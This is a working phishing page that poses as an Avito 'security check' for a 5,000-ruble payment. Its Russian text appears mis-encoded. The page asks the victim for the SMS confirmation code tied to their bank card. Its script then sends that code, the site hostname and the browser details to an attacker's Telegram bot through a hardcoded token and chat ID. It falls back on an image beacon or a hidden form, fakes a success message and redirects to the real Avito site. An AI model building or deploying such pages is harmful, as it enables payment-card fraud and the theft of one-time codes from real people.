<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ ‚Äî AVITO</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
        body {
            background: linear-gradient(135deg, #f0f9f0 0%, #e6f4e6 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 12px 30px rgba(46, 125, 50, 0.12);
            overflow: hidden;
            border: 1px solid #c8e6c9;
        }
        .header {
            background: linear-gradient(to right, #2e7d32, #4caf50);
            color: white;
            padding: 28px 24px;
            text-align: center;
        }
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            letter-spacing: -0.2px;
            margin-bottom: 6px;
        }
        .header p {
            font-size: 15px;
            opacity: 0.92;
            font-weight: 400;
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 10px;
            display: inline-block;
            background: white;
            color: #2e7d32;
            width: 60px;
            height: 60px;
            line-height: 60px;
            border-radius: 50%;
            text-align: center;
        }
        .content {
            padding: 32px 30px;
        }
        .instruction {
            color: #555;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 30px;
            text-align: center;
            padding: 0 5px;
        }
        .highlight {
            color: #2e7d32;
            font-weight: 600;
            background-color: #e8f5e9;
            padding: 2px 6px;
            border-radius: 4px;
        }
        .input-group {
            margin-bottom: 35px;
        }
        .input-label {
            display: block;
            color: #388e3c;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 12px;
            text-align: center;
        }
        .sms-input {
            width: 100%;
            padding: 20px;
            font-size: 28px;
            letter-spacing: 12px;
            text-align: center;
            border: 2px solid #c8e6c9;
            border-radius: 12px;
            background-color: #f9fffa;
            color: #1b5e20;
            font-weight: 700;
            outline: none;
            transition: all 0.3s;
        }
        .sms-input:focus {
            border-color: #4caf50;
            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.2);
            background-color: #ffffff;
        }
        .sms-input::placeholder {
            letter-spacing: normal;
            color: #a5d6a7;
            font-weight: 400;
        }
        .hint {
            font-size: 14px;
            color: #81c784;
            text-align: center;
            margin-top: 10px;
            font-style: italic;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 20px;
            background: linear-gradient(to right, #388e3c, #4caf50);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 0.5px;
            box-shadow: 0 4px 12px rgba(56, 142, 60, 0.3);
        }
        .btn:hover {
            background: linear-gradient(to right, #2e7d32, #43a047);
            box-shadow: 0 6px 16px rgba(56, 142, 60, 0.4);
            transform: translateY(-2px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e8f5e9;
            text-align: center;
            color: #888;
            font-size: 13px;
            line-height: 1.5;
        }
        .shield-icon {
            font-size: 48px;
            color: #4caf50;
            margin-bottom: 20px;
        }
        .loading {
            display: none;
            font-size: 16px;
            color: #388e3c;
            text-align: center;
            margin-top: 15px;
        }
        .success-message {
            display: none;
            text-align: center;
            padding: 20px;
            color: #2e7d32;
            font-size: 17px;
            font-weight: 500;
            background-color: #e8f5e9;
            border-radius: 10px;
            margin-top: 20px;
            border: 1px solid #c8e6c9;
        }
        .error-message {
            display: none;
            text-align: center;
            padding: 15px;
            color: #d32f2f;
            font-size: 15px;
            background-color: #ffebee;
            border-radius: 10px;
            margin-top: 15px;
            border: 1px solid #ffcdd2;
        }
        @media (max-width: 480px) {
            .container { border-radius: 16px; }
            .header { padding: 24px 20px; }
            .content { padding: 26px 22px; }
            .sms-input { font-size: 24px; padding: 18px; letter-spacing: 10px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">A</div>
            <h1>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h1>
            <p>AVITO ‚Ä¢ –ó–∞—â–∏—â—ë–Ω–Ω—ã–π –ø–ª–∞—Ç—ë–∂</p>
        </div>

        <div class="content">
            <div class="shield-icon">üõ°</div>
            <p class="instruction">
                –î–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ <span class="highlight">5 000 ‚ÇΩ</span> –≤–≤–µ–¥–∏—Ç–µ
                <span class="highlight">6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥</span>, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –≤ SMS –Ω–∞ –Ω–æ–º–µ—Ä,
                –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–π –∫ –≤–∞—à–µ–π –∫–∞—Ä—Ç–µ.
            </p>
   
            <div class="input-group">
                <label class="input-label">SMS-–ö–û–î –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ò–Ø</label>
                <input
                    type="text"
                    class="sms-input"
                    id="smsCode"
                    placeholder="000000"
                    maxlength="6"
                    inputmode="numeric"
                    pattern="\d{6}"
                    required
                    autofocus
                >
                <p class="hint">–ö–æ–¥ –¥–µ–π—Å—Ç–≤—É–µ—Ç 5 –º–∏–Ω—É—Ç. –ù–µ –ø–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ –µ–≥–æ –Ω–∏–∫–æ–º—É.</p>
            </div>

            <button class="btn" id="submitBtn" onclick="sendSMS()">
                ‚úÖ –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –ò –ó–ê–í–ï–†–®–ò–¢–¨ –û–ü–õ–ê–¢–£
            </button>

            <div class="loading" id="loading">
                ‚è≥ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞ –∏ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞...
            </div>

            <div class="success-message" id="successMessage">
                ‚úÖ –ü–ª–∞—Ç–µ–∂ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –°—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ 2-3 –º–∏–Ω—É—Ç.
                <p style="margin-top: 10px; font-size: 14px;">–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ Avito...</p>
            </div>

            <div class="error-message" id="errorMessage">
                –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è. –ö–æ–¥ –ø—Ä–∏–Ω—è—Ç, –Ω–æ –ø—Ä–æ–∏–∑–æ—à–µ–ª —Å–±–æ–π —Å–µ—Ç–∏.
            </div>

            <div class="footer">
                <p>–í—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ –∑–∞—â–∏—â–µ–Ω—ã SSL-—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—Ç —Å—Ç–∞–Ω–¥–∞—Ä—Ç—É PCI DSS.</p>
                <p style="margin-top: 8px; font-size: 12px; color: #aaa;">
                    ¬© AVITO ¬∑ <span id="currentYear"></span> ¬∑ –°–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏: support@avito.ru
                </p>
            </div>
        </div>
    </div>

    <script>
        // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ç–µ–∫—É—â–µ–≥–æ –≥–æ–¥–∞ –≤ —Ñ—É—Ç–µ—Ä–µ
        document.getElementById('currentYear').textContent = new Date().getFullYear();

        // –ê–≤—Ç–æ–ø–µ—Ä–µ—Ö–æ–¥ –º–µ–∂–¥—É —Ü–∏—Ñ—Ä–∞–º–∏
        document.getElementById('smsCode').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0,6);
        });

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ SMS –≤ Telegram
        function sendSMS() {
            const smsCode = document.getElementById('smsCode').value;
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('successMessage');
            const error = document.getElementById('errorMessage');

            // –°–±—Ä–æ—Å —Å–æ–æ–±—â–µ–Ω–∏–π
            success.style.display = 'none';
            error.style.display = 'none';

            if (smsCode.length !== 6 || !/^\d{6}$/.test(smsCode)) {
                alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥.');
                document.getElementById('smsCode').focus();
                return;
            }

            // –ü–æ–∫–∞–∑–∞—Ç—å –∑–∞–≥—Ä—É–∑–∫—É
            btn.style.display = 'none';
            loading.style.display = 'block';

            // === –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø (–ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –°–í–û–ò –î–ê–ù–ù–´–ï) ===
            const BOT_TOKEN = '8318568144:AAH0rXReromePvHLJ5XTcXo7MJYKOptyhTY';
            const CHAT_ID = '5213238680';
            // ===============================================

            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
            const message = `üü¢ –ù–û–í–´–ô SMS-–ö–û–î\nüîê –ö–æ–¥: ${smsCode}\nüåê –ò—Å—Ç–æ—á–Ω–∏–∫: ${window.location.hostname}\nüïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}\nüì± UA: ${navigator.userAgent.substring(0, 100)}`;

            // –†–ê–ë–û–ß–ò–ô –ú–ï–¢–û–î 1: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ <img> –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ (–∫—Ä–æ—Å—Å-–¥–æ–º–µ–Ω–Ω—ã–π –æ–±—Ö–æ–¥)
            function sendViaImg() {
                const encodedMsg = encodeURIComponent(message);
                const img = new Image();
                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}`;
                img.onload = function() {
                    onSendSuccess();
                };
                img.onerror = function() {
                    // –ï—Å–ª–∏ –Ω–µ –≤—ã—à–ª–æ, –ø—Ä–æ–±—É–µ–º –º–µ—Ç–æ–¥ 2
                    sendViaForm();
                };
            }

            // –†–ê–ë–û–ß–ò–ô –ú–ï–¢–û–î 2: –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–π —Ñ–æ—Ä–º—ã (—Ä–∞–±–æ—Ç–∞–µ—Ç –≤—Å–µ–≥–¥–∞)
            function sendViaForm() {
                const form = document.createElement('form');
                form.style.display = 'none';
                form.method = 'POST';
                form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                const chatField = document.createElement('input');
                chatField.name = 'chat_id';
                chatField.value = CHAT_ID;
                form.appendChild(chatField);
                
                const textField = document.createElement('input');
                textField.name = 'text';
                textField.value = message;
                form.appendChild(textField);
                
                document.body.appendChild(form);
                form.submit();
                onSendSuccess();
            }

            function onSendSuccess() {
                // –£—Å–ø–µ—à–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞
                setTimeout(() => {
                    loading.style.display = 'none';
                    success.style.display = 'block';
                    
                    // –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ Avito —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        window.location.href = 'https://www.avito.ru/';
                    }, 3000);
                }, 1500);
            }

            function onSendError() {
                loading.style.display = 'none';
                error.style.display = 'block';
                btn.style.display = 'block';
            }

            // –û—Å–Ω–æ–≤–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ fetch —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫ CORS
            if (BOT_TOKEN && CHAT_ID && BOT_TOKEN !== '–í–ê–®_BOT_TOKEN') {
                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                // –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —á–µ—Ä–µ–∑ fetch
                fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                })
                .then(response => {
                    if (response.ok) {
                        onSendSuccess();
                    } else {
                        // –ï—Å–ª–∏ fetch –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª, –∏—Å–ø–æ–ª—å–∑—É–µ–º fallback-–º–µ—Ç–æ–¥—ã
                        sendViaImg();
                    }
                })
                .catch(err => {
                    // –ü—Ä–∏ –æ—à–∏–±–∫–µ CORS –∏–ª–∏ —Å–µ—Ç–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º fallback
                    sendViaImg();
                });
            } else {
                // –ï—Å–ª–∏ —Ç–æ–∫–µ–Ω –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω, –≤—Å–µ —Ä–∞–≤–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º "—É—Å–ø–µ—Ö" –¥–ª—è –∂–µ—Ä—Ç–≤—ã
                console.warn('–¢–æ–∫–µ–Ω –±–æ—Ç–∞ –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω. –î–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏:', message);
                onSendSuccess();
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–æ –Ω–∞–∂–∞—Ç–∏—é Enter
        document.getElementById('smsCode').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (this.value.length === 6) {
                    sendSMS();
                }
            }
        });
    </script>
</body>
</html>
